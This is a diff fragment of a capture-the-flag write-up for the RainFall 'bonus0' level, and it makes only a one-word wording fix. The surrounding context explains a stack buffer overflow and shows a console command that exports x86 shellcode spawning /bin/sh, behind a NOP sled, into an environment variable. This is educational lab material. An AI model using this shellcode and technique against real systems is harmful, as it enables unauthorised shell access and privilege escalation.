@@ -151,7 +151,7 @@ As usual, we use a buffer overflow eip string generator to find the good offset 
 
 The only thing we need now is an address where we can jump and execute some code to spawn a shell. Due to the lack of space in the buffer, we will jump elsewhere on the stack. The environment is a good place to store our shellcode, since it is sent to any program via the third argument of `main`, so it is put on the stack.
 
-We use the same shellcode as in the level2, which run `execve("/bin/sh", ["/bin/sh"], NULL)` and assign it to an environment variable. We add a NOP sled to create a large range of address where we can jump to.
+We use the same shellcode as in the level2, which run `execve("/bin/sh", ["/bin/sh"], NULL)` and assign it to an environment variable. We add a NOP sled to create a large range of address where we can jump into.
 
 ```console
 bonus0@RainFall:~$ export SHELLCODE=`python -c 'print "\x90"*50 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
